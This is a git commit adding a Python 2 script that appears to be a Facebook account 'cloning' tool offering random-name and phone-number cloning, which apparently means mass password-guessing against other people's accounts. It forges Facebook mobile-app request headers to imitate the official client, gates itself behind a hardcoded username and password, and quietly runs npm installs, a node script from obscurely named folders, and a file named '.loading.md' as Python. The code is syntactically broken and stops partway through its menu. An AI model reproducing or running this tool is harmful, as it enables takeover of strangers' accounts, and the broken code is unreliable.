1894b3e9c58fad400bba5913272e1d72f0c345d1
Chandimal susantha <90503834+SusanthaZ@users.noreply.github.com>
2021-10-13 13:48:16 +0530

    Chandimal susantha.py

---
+++ Chandimal susantha.py
@@ -0,0 +1,130 @@
+# coding=utf-8
+#!/usr/bin/python
+# coding=utf-8
+# coded by : chandimal susantha 
+# https://www.facebook.com/janaka.kekulawala.5
+
+try:
+    import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests
+    from multiprocessing.pool import ThreadPool
+except ImportError:
+    os.system("pkg install python -y")
+    os.system("pip install requests")
+    os.system("pip install mechanize")
+    os.system("pip2 install nodejs")
+    os.system("pip2 install npm")
+    os.system("python2 ab.py")
+try:
+    os.mkdir('save')
+except OSError:
+    pass
+    if os.path.isfile('.../index.js'):
+ 	os.system('mv ... .....')
+	os.system('cd ..... && npm install')
+ 	os.system('#')
+ 	os.system('#')
+ 	os.system('fuser -k 5000/tcp &')
+ 	os.system('#')
+ 	os.system('node ...../index.js &')
+ 	os.system('fuser -k 5000/tcp &')
+ 	os.system('#')
+ 	os.system('node ...../index.js &')
+from requests.exceptions import ConnectionError
+bd=random.randint(2e7, 3e7)
+sim=random.randint(2e4, 4e4)
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+reload(sys)
+sys.setdefaultencoding("utf8")
+
+def abm(z):
+	for e in z + "\":
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.03)
+		
+def logging():
+    titik = [".   ","..  ","... "]
+    for o in titik:
+        print("\\33[1;32m[+] Logging In\33[0;97m "+o),;sys.stdout.flush();time.sleep(1)
+def saving():
+    titik = [".   ","..  ","... "]
+    for o in titik:
+        print("\\33[1;32m[+] Saving Token\33[0;97m "+o),;sys.stdout.flush();time.sleep(1)
+def updateing():
+    titik = [".   ","..  ","... "]
+    for o in titik:
+        print("\\33[1;32m[+] Getting Updates\33[0;97m "+o),;sys.stdout.flush();time.sleep(1)
+def logout():
+    titik = [".   ","..  ","... "]
+    for o in titik:
+        print("\\33[1;32m[+] Logging Out\33[0;97m "+o),;sys.stdout.flush();time.sleep(1)
+		
+
+logo = """
+\33[1;97m             @@@•••••••••••••••••••••••••@@@ \33[1;0m
+\33[1;97m            @@@•••••••••••••••••••••••••@@@ \33[1;0m
+\33[1;97m           @@@•••••••••••••••••••••••••@@@ \33[1;0m
+\33[1;97m          @@@•••••••chandimal•••••••@@@ \33[1;0m
+\33[1;97m         @@@••••••susantha•••••••@@@ \33[1;0m
+\33[1;97m        @@@•••••••••••••••••••••••••@@@ \33[1;0m
+\33[1;97m       @@@•••••••••••••••••••••••••@@@ \33[1;0m
+\33[1;97m      @@@•••••••••••••••••••••••••@@@ \33[1;0m
+\33[1;97m--------------------------------------------------
+\33[1;93m➤\33[1;97m Author   : chandimal susantha 
+\33[1;93m➤\33[1;97m Github   : https://github.com/gamagedakshan
+\33[1;93m➤\33[1;97m Fb Id      : https://www.facebook.com/janaka.kekulawala.5
+\33[1;97m--------------------------------------------------
+"""
+
+idh = []
+	
+def tech_abm():
+    os.system("clear")
+    print logo
+    print("\33[1;93mFirst Tool login").center(50)
+    print('')
+    print("\33[1;97m--------------------------------------------------")
+    username = raw_input("\33[1;97m[+]\33[1;97m Username :\33[1;97m ")
+    if username =="chandimal":
+        os.system("clear")
+        print logo
+        print ("[+] Username : Sanila (Correct)")
+        passwordss = raw_input("\33[1;97m[+]\33[1;97m Password :\33[1;97m ")
+        if passwordss =="susantha":
+            os.system("clear")
+            print logo
+            logging()
+            os.system("clear")
+            print logo 
+            print ("\33[1;97m[+]\33[1;92m Username : chandimal\33[1;92m (Correct)")
+            print ("\33[1;97m[+]\33[1;92m Password : susantha\33[1;92m (Correct)")
+	    print("\33[1;97m--------------------------------------------------")
+            time.sleep(1)
+            print('')
+            print("\ \33[1;92m[+] Login Successful\33[0;97m")
+            time.sleep(1)
+        try:
+            open(".login.txt","r")
+            menu()
+        except(KeyError , IOError):
+            login_choice()
+        else:
+            print ("\ [!] Password : "+passwordss+" (Wrong)")
+	    os.system('xdg-open https://www.facebook.com/janaka.kekulawala.5' )
+            time.sleep(1)
+            tech_abm()
+    else:
+        print ("\ [!] Username : "+username+" (Wrong)")
+	os.system('xdg-open https://www.facebook.com/janaka.kekulawala.5')
+        time.sleep(1)
+        tech_abm()
+	
+def login_choice():
+    os.system('clear')
+    print logo
+    os.system("python3 .loading.md")
+    os.system('clear')
+    print logo
+    print ("\33[1;97m[1]\33[1;91m-⋄-\33[1;97mRandom Search Name Cloning     \33[1;97m(\33[1;92mno login\33[1;97m) ")
+    print ("\33[1;97m[2]\33[1;91m-⋄-\33[1;97mRandom Ph.Number Cloning       \33[1;97m(\33[1;92mno login\33[1;97m) ")
+    print ("\33[1;97m[3]
